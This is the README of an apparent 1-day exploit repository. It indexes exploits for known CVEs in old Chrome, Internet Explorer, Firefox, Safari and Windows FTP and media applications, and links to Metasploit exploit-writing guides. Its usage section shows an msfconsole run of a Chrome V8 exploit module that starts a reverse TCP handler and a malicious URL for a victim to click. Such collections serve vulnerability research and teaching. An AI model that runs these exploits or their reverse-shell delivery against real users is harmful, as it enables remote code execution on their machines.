# 1-day exploits
1day exploit repo

## Database
CVE Number | Target | Type | OS | Version | Author 
---------- | -------| ---- | -- | ------- | ------ 
[CVE-2019-5825](windows/browser/chromium/941743/README.md) | Chrome | Browser | Windows | 73.0.3683.86 (64bit) | _Hwiwon Lee_
[CVE-2017-????](linux/browser/chromium/716044/README.md) | Chrome | Browser | Linux | 60.0.3080.5 (64bit) | _Hwiwon Lee_
[CVE-2016-1646](windows/browser/chromium/594574/README.md) | Chrome | Browser | Windows | 49.0.2623.87 (64bit) | _Hwiwon Lee_
[CVE-2017-????](windows/browser/chromium/746946/README.md) | Chrome | Browser | Windows | 59.0.3071.109 (64bit) | _Hwiwon Lee_
[CVE-2016-3207](windows/browser/ie/20163207/README.md) | IE | Browser | Windows | 11.0.9600.17420(32bit) | _Hyeonhak Kim_
[CVE-2017-0037](windows/browser/ie/20170037/README.md) | IE | Browser | Windows | 11.0.9600.18537(32bit) | _Hyeonhak Kim_
[CVE-2019-9760](windows/FTP/FTPGetter5.97/README.md) | FTPGetter | FTP Client | Windows | 5.97.0.177(64bit) | _Hyeonhak Kim_
[CVE-2016-????](windows/FTP/FTPShell5.24/README.md) | FTPShell | FTP Client | Windows | 5.24(32bit) | _Hyeonhak Kim_
[CVE-2019-????](linux/browser/chromium/46654/README.md) | Chrome | Browser | Linux | 74.0.3702.0 (64bit) | _Youngjoon Kim_
[CVE-2019-????](linux/browser/chromium/46748/README.md) | Chrome | Browser | Linux | 74.0.3725.0 (64bit) | _Youngjoon Kim_
[CVE-2019-0752](windows/browser/ie/20190752/README.md) | IE | Browser | Windows | 11.379.17763.0 (64bit) | _Youngjoon Kim_
[CVE-2017-5375&CVE-2016-1960](windows/browser/firefox/Firefox%2044.0.2%20-%20ASM.JS%20JIT-Spray%20Remote%20Code%20Execution(CVE-2017-5375%3BCVE-2016-1960)/README.md) | firefox | Browser | Windows | 44.0.2 | _Sungha Park_
[CVE-2017-5375&CVE-2016-2819](windows/browser/firefox/Firefox%2046.0.1%20-%20ASM.JS%20JIT-Spray%20Remote%20Code%20Execution(CVE-2017-5375%3BCVE-2016-2819)/README.md) | firefox | Browser | Windows | 46.0.1 | _Sungha Park_
[CVE-2017-5375&CVE-2016-9079](windows/browser/firefox/Firefox%2050.0.1%20-%20ASM.JS%20JIT-Spray%20Remote%20Code%20Execution(CVE-2017-5375%3BCVE-2016-9079)/README.md) | firefox | Browser | Windows | 50.0.1 | _Sungha Park_
[CVE-2017-5415](windows/browser/firefox/Mozilla%20Firefox%20-%20Address%20Bar%20Spoofing/README.md) | firefox | Browser | Windows | 50.0.1 | _Sungha Park_
[CVE-2019-0541](windows/browser/ie/Microsoft%20Windows%20MSHTML%20Engine%20-%20Edit%20Remote%20Code%20Execution(CVE-2019-0541)/README.md) | ie | Browser | Windows | 8.0.6001.18702| _Sungha Park_
[CVE-2019-9766](windows/windows/player/free_mp3_cd_ripper/README.md) | Free MP3 CD Ripper | player | Windows | 2.6 | _Sungha Park_
[CVE-2019-???(EDB-46279)](windows/player/HTML5%20Video%20Player/README.md) | HTML5 Video Player | player | Windows | 1.2.5 | _Sungha Park_
[CVE-2018-4314](macos/browser/safari/cve-2018-4314/README.md) | Safari | Browser | macOS | 11.1.2 (64bit) | _Hwiwon Lee_
[CVE-2017-15399](windows/browser/chromium/201715399/README.md) | Chrome | Browser | Windows | 62.0.3202.89  | _Youngjoon Kim_

## Metasploit
[Official Repo](https://github.com/rapid7/metasploit-framework)  
[How to write a browser exploit using BrowserExploitServer](https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-browser-exploit-using-BrowserExploitServer)  
[How to write a browser exploit using HttpServer](https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-browser-exploit-using-HttpServer)  

## vulncode-db 
Useful vulnerable code db site [demo](https://www.vulncode-db.com/) and [open source](https://github.com/google/vulncode-db)

## Environment Setup
### Chromium
[Downloading old builds of Chrome / Chromium](https://www.chromium.org/getting-involved/download-chromium)
### Internet Explorer
[Downloading old version update of IE](https://www.catalog.update.microsoft.com)

## How to use
### Attacker
```
$ msfconsole
...
[*] Starting persistent handler(s)...
msf5 > use exploit/windows/browser/chrome_v8_oob_access_594574 
msf5 exploit(windows/browser/chrome_v8_oob_access_594574) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] Using URL: http://0.0.0.0:8080/B3mDU4Cmr
[*] Local IP: http://127.0.0.1:8080/B3mDU4Cmr
[*] Server started.
```

### Victim
Click the url link :D
